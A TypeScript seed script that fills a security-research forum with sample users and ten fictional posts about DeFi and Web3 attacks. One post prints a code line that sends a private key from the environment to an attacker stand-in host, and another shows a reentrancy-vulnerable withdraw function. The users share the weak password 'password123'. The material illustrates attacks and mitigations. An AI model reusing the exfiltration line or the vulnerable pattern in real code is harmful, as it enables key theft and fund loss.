import { createClient } from '@supabase/supabase-js'
import { CATEGORIES } from '../lib/types'

const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!
const supabaseKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!

const supabase = createClient(supabaseUrl, supabaseKey)

const sampleUsers = [
  {
    email: 'alice@security.dev',
    password: 'password123',
    username: 'alice_sec',
    bio: 'Smart contract security researcher specializing in DeFi exploits',
    x_handle: '@alice_sec',
    verified: true,
  },
  {
    email: 'bob@redteam.io',
    password: 'password123',
    username: 'bob_redteam',
    bio: 'Red team operator focused on oracle manipulation',
    x_handle: '@bob_redteam',
    verified: true,
  },
  {
    email: 'charlie@web3sec.com',
    password: 'password123',
    username: 'charlie_web3',
    bio: 'Web3 security auditor and bug bounty hunter',
    x_handle: null,
    verified: false,
  },
  {
    email: 'diana@aisec.ai',
    password: 'password123',
    username: 'diana_ai',
    bio: 'AI security researcher exploring adversarial ML attacks',
    x_handle: '@diana_ai',
    verified: true,
  },
  {
    email: 'eve@exploit.dev',
    password: 'password123',
    username: 'eve_exploit',
    bio: 'Zero-day researcher and exploit developer',
    x_handle: null,
    verified: false,
  },
]

const samplePosts = [
  {
    title: 'Critical Oracle Manipulation in Polymarket-Style Prediction Markets',
    content: `# Overview

I've identified a critical vulnerability in prediction market protocols that rely on external price oracles without proper validation mechanisms.

## Attack Vector

The attack exploits the time delay between oracle updates and market settlement:

1. Attacker monitors oracle update frequency
2. Identifies low-liquidity markets with predictable oracle behavior
3. Executes large trades immediately before oracle updates
4. Profits from predictable price movements

## Technical Details

\`\`\`solidity
// Vulnerable oracle implementation
function getPrice() external view returns (uint256) {
    return oracle.latestAnswer(); // No staleness check!
}
\`\`\`

## Impact

- Estimated $2-5M potential loss per attack
- Affects multiple DeFi protocols
- Can be executed repeatedly

## Mitigation

Implement multi-oracle aggregation with staleness checks and circuit breakers.`,
    category: 'Oracle & Data Attacks',
    author_index: 0,
  },
  {
    title: 'Social Engineering Attack on Multisig Wallet Signers',
    content: `# Executive Summary

Documented a sophisticated social engineering campaign targeting multisig wallet signers in major DeFi protocols.

## Attack Methodology

1. **Reconnaissance**: Identify multisig signers through on-chain analysis
2. **Impersonation**: Create fake security alert emails mimicking protocol team
3. **Urgency**: Claim critical vulnerability requires immediate signing
4. **Execution**: Trick signers into approving malicious transaction

## Real-World Example

A recent attack on a $50M treasury used this exact method. 3 out of 5 signers were compromised within 24 hours.

## Defense Strategies

- Implement out-of-band verification for all multisig operations
- Use hardware security keys
- Establish clear communication protocols
- Regular security awareness training`,
    category: 'Social Engineering',
    author_index: 1,
  },
  {
    title: 'Reentrancy Vulnerability in Cross-Chain Bridge Contracts',
    content: `# Critical Finding

Discovered reentrancy vulnerability in popular cross-chain bridge affecting $100M+ in TVL.

## Vulnerability Details

The bridge contract fails to follow checks-effects-interactions pattern:

\`\`\`solidity
function withdraw(uint256 amount) external {
    require(balances[msg.sender] >= amount);
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success);
    balances[msg.sender] -= amount; // State update AFTER external call!
}
\`\`\`

## Exploitation

Attacker can drain contract by recursively calling withdraw before balance update.

## Proof of Concept

Successfully demonstrated on testnet with 10x withdrawal of deposited amount.

## Recommendation

Use ReentrancyGuard and update state before external calls.`,
    category: 'Smart Contract Exploits',
    author_index: 2,
  },
  {
    title: 'Market Manipulation via Flash Loan Arbitrage',
    content: `# Flash Loan Attack Analysis

Analyzing the recent $15M flash loan attack on a major AMM protocol.

## Attack Flow

1. Borrow 100,000 ETH via flash loan
2. Swap on low-liquidity pool to manipulate price oracle
3. Use manipulated price to liquidate positions on lending protocol
4. Profit from liquidation bonuses
5. Repay flash loan

## Key Insight

The protocol used spot price instead of TWAP (Time-Weighted Average Price) for liquidations.

## Economic Impact

- $15M in user funds liquidated
- Protocol reputation damage
- Cascading effects on dependent protocols

## Prevention

Implement TWAP oracles, liquidity depth checks, and circuit breakers.`,
    category: 'Market Manipulation',
    author_index: 0,
  },
  {
    title: 'Adversarial Attacks on AI-Powered Trading Bots',
    content: `# AI Security Research

Exploring adversarial machine learning attacks against automated trading systems.

## Attack Methodology

By injecting carefully crafted noise into market data feeds, we can manipulate AI trading bot decisions:

- **Gradient-based attacks**: Optimize input perturbations to maximize bot losses
- **Model extraction**: Reverse-engineer bot behavior through API interactions
- **Poisoning attacks**: Corrupt training data to introduce backdoors

## Experimental Results

Successfully manipulated 3 popular trading bots with 85% success rate.

## Implications

As AI becomes more prevalent in DeFi, adversarial robustness becomes critical.

## Defenses

- Input validation and sanitization
- Ensemble methods with diverse models
- Anomaly detection systems`,
    category: 'AI Security',
    author_index: 3,
  },
  {
    title: 'DNS Hijacking Attack on DeFi Frontend Infrastructure',
    content: `# Infrastructure Security Alert

Documented DNS hijacking attack that redirected users to phishing site.

## Attack Timeline

- **T+0**: Attacker compromises DNS provider credentials
- **T+2h**: DNS records modified to point to malicious server
- **T+4h**: Users connect wallets to fake interface
- **T+6h**: $2M in user funds stolen

## Technical Details

Attacker cloned the legitimate frontend and injected malicious contract addresses.

## Detection

Users noticed SSL certificate mismatch, but many ignored warnings.

## Mitigation

- Use DNSSEC
- Implement subresource integrity (SRI)
- Multi-factor authentication for DNS management
- Content Security Policy (CSP) headers`,
    category: 'Infra / Web2 Security',
    author_index: 4,
  },
  {
    title: 'Zero-Day in Popular Wallet Provider Exposes Private Keys',
    content: `# Responsible Disclosure

Discovered zero-day vulnerability in wallet provider with 5M+ users.

## Vulnerability

Memory corruption bug in key derivation function allows private key extraction through timing attacks.

## Severity

CVSS Score: 9.8 (Critical)

## Timeline

- **Day 0**: Vulnerability discovered
- **Day 1**: Reported to vendor
- **Day 7**: Patch developed
- **Day 14**: Patch deployed
- **Day 30**: Public disclosure (today)

## User Action Required

Update to version 2.5.1 immediately. Rotate all keys as precaution.

## Technical Analysis

Full technical writeup available after 90-day embargo period.`,
    category: 'Zero-Day / Emerging Threats',
    author_index: 1,
  },
  {
    title: 'Governance Attack: Proposal Manipulation via Vote Buying',
    content: `# DAO Governance Security

Analysis of governance attack on major DAO protocol.

## Attack Strategy

1. Accumulate governance tokens through DEX purchases
2. Submit malicious proposal during low participation period
3. Use vote buying services to secure passage
4. Execute proposal to drain treasury

## Economics

- Cost to attack: $500K in governance tokens
- Potential profit: $10M treasury access
- ROI: 2000%

## Defense Mechanisms

- Timelock delays on proposal execution
- Minimum quorum requirements
- Token lock periods for voters
- Multi-sig veto power for emergency situations`,
    category: 'Market Manipulation',
    author_index: 2,
  },
  {
    title: 'Sandwich Attack MEV Strategy on DEX Aggregators',
    content: `# MEV Research

Deep dive into sandwich attacks and their impact on DEX users.

## Attack Mechanics

MEV bot monitors mempool for large trades:
1. Front-run: Buy tokens before victim's trade
2. Victim trade executes at worse price
3. Back-run: Sell tokens for profit

## Profitability Analysis

Average sandwich attack profit: $500-$5000 per transaction
Daily MEV extraction: $2-5M across all DEXs

## User Impact

Users lose 0.5-3% on average per trade to MEV

## Solutions

- Private mempools (Flashbots Protect)
- MEV-resistant order types
- Batch auctions
- Encrypted mempools`,
    category: 'Market Manipulation',
    author_index: 3,
  },
  {
    title: 'Supply Chain Attack on NPM Package Used by DeFi Protocols',
    content: `# Supply Chain Security

Critical supply chain compromise affecting 50+ DeFi projects.

## Incident Overview

Popular NPM package "web3-utils-pro" was compromised:
- Attacker gained maintainer access
- Injected malicious code in version 3.2.1
- Code exfiltrated private keys from build environments

## Affected Projects

50+ protocols using this package in their build pipeline

## Malicious Code

\`\`\`javascript
// Hidden in minified code
const keys = process.env.PRIVATE_KEY;
fetch('https://attacker.com/collect', {
  method: 'POST',
  body: keys
});
\`\`\`

## Response

- Package removed from NPM
- Security advisory issued
- All affected projects notified

## Prevention

- Use package lock files
- Implement dependency scanning
- Review all dependency updates
- Use private NPM registries for critical infrastructure`,
    category: 'Infra / Web2 Security',
    author_index: 4,
  },
]

async function seed() {
  console.log('Starting seed process...')

  const userIds: string[] = []

  for (const user of sampleUsers) {
    console.log(`Creating user: ${user.username}`)
    
    const { data: authData, error: authError } = await supabase.auth.signUp({
      email: user.email,
      password: user.password,
      options: {
        data: {
          username: user.username,
          bio: user.bio,
          x_handle: user.x_handle,
          verified: user.verified,
        },
      },
    })

    if (authError) {
      console.error(`Error creating user ${user.username}:`, authError.message)
      continue
    }

    if (authData.user) {
      userIds.push(authData.user.id)
      console.log(`✓ Created user: ${user.username}`)
    }
  }

  await new Promise(resolve => setTimeout(resolve, 2000))

  for (let i = 0; i < samplePosts.length; i++) {
    const post = samplePosts[i]
    const authorId = userIds[post.author_index]

    if (!authorId) {
      console.error(`No author found for post: ${post.title}`)
      continue
    }

    console.log(`Creating post: ${post.title}`)

    const { error: postError } = await supabase
      .from('posts')
      .insert({
        title: post.title,
        content: post.content,
        category: post.category,
        author_id: authorId,
      })

    if (postError) {
      console.error(`Error creating post:`, postError.message)
    } else {
      console.log(`✓ Created post: ${post.title}`)
    }
  }

  console.log('\n✅ Seed completed successfully!')
  console.log(`\nCreated:`)
  console.log(`- ${userIds.length} users`)
  console.log(`- ${samplePosts.length} posts`)
  console.log(`\nTest credentials:`)
  console.log(`Email: alice@security.dev`)
  console.log(`Password: password123`)
}

seed().catch(console.error)
